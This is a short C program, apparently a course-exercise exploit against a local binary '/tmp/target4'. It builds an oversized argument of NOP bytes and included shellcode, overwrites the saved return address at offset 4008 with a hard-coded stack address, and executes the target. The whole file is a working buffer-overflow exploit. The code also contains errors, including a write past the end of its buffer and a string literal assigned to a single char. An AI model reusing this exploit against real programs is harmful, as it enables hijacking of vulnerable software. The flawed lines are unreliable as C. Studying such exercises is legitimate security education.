#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;
  args[1] = malloc(32768);                                                        
  args[1][32768]="\0";                                                            
  memset(args[1],0x90, 32768);                                                    
  memcpy(args[1],shellcode,strlen(shellcode));                                  
  *(unsigned int*)(args[1] + 4008)= 0xbfff6e94;    

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
